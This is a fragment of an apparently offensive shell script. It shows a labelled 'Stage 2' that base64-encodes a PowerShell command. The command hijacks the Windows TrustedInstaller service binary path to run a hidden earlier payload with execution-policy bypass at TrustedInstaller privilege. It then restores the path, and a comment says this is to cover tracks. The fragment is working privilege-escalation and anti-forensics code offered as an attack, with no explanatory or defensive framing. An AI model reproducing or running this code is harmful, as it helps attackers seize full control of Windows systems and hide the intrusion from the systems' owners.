...
# Stage 2: elevate the payload's token to TrustedInstaller privileges using service binary paths and immediately clean up to cover tracks
payload_stage2=$(python3 -c "import base64; print(base64.b64encode((r\"\"\"\$sc.exe config \"TrustedInstaller\" binpath= \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"; \$ti = Get-Service \"TrustedInstaller\"; \$ti.start(@(\"-ep\", \"bypass\", \"-WindowStyle\", \"Hidden\", \"-c\", \"Start-Process 'powershell.exe' \-ArgumentList '-ep bypass -WindowStyle Hidden -e $payload_stage1' \-WindowStyle Hidden\")); sc.exe config 'TrustedInstaller' binpath= 'C:\\Windows\\servicing\\TrustedInstaller.exe'\"\"\").encode(\"utf-16-le\")).decode())")
